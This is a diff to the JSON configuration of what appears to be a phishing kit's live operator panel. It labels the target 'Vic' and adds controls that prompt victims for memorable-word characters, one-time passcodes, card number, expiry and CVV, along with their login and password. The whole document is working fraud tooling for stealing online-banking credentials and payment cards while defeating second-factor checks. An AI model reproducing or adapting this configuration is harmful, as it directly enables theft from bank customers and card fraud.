@@ -3325,25 +3325,61 @@
     "buttons": [
       {
         "name": "ASK LOGIN AGAIN",
-        "status": "7"
+        "status": "0"
       },
       {
-        "name": "ASK SMS OTP",
-        "status": "2"
+        "name": "ASK MEMORABLE",
+        "status": "2",
+        "inputs": [
+          {
+            "id": "memIndex1",
+            "placeholder": "Character 1 Index"
+          },
+          {
+            "id": "memIndex2",
+            "placeholder": "Character 2 Index"
+          },
+          {
+            "id": "memIndex3",
+            "placeholder": "Character 3 Index"
+          }
+        ]
       },
       {
-        "name": "ASK EMAIL OTP",
+        "name": "ASK CARD AGAIN",
         "status": "4"
       },
       {
+        "name": "ASK OTP",
+        "status": "6",
+        "inputs": [
+          {
+            "id": "otpIndex1",
+            "placeholder": "Character 1 Index"
+          },
+          {
+            "id": "otpIndex2",
+            "placeholder": "Character 2 Index"
+          },
+          {
+            "id": "otpIndex3",
+            "placeholder": "Character 3 Index"
+          },
+          {
+            "id": "otpIndex4",
+            "placeholder": "Character 4 Index"
+          }
+        ]
+      },
+      {
         "name": "FINISH",
-        "status": "6"
+        "status": "8"
       }
     ],
     "status": [
       {
         "status": 0,
-        "meaning": "Vic Resubmitted Login"
+        "meaning": "Vic Resubmitting Login"
       },
       {
         "status": 1,
@@ -3351,27 +3387,35 @@
       },
       {
         "status": 2,
-        "meaning": "Vic Submitting SMS OTP"
+        "meaning": "Vic Submitting Memorable"
       },
       {
         "status": 3,
-        "meaning": "Vic Waiting... Submitted SMS OTP"
+        "meaning": "Vic Waiting... Submitted Memorable"
       },
       {
         "status": 4,
-        "meaning": "Vic Submitting Email OTP"
+        "meaning": "Vic Submitting Billing Info"
       },
       {
         "status": 5,
-        "meaning": "Vic Waiting... Submitted Email OTP"
+        "meaning": "Vic Waiting... Submitted Billing Info"
       },
       {
         "status": 6,
-        "meaning": "Finished"
+        "meaning": "Vic Submitting OTP"
       },
       {
         "status": 7,
-        "meaning": "Vic Resubmitting Login"
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 8,
+        "meaning": "Finished"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Waiting... Resubmitted Login"
       }
     ],
     "information": [
@@ -3384,12 +3428,24 @@
         "key": "password"
       },
       {
-        "heading": "SMS OTP",
-        "key": "smsCode"
+        "heading": "Memorable",
+        "key": "memorable"
       },
       {
-        "heading": "Email OTP",
-        "key": "emailCode"
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "Card Number",
+        "key": "ccnum"
+      },
+      {
+        "heading": "Card Expiry",
+        "key": "ccexp"
+      },
+      {
+        "heading": "CVV",
+        "key": "cvv"
       }
     ],
     "mainInfo": [
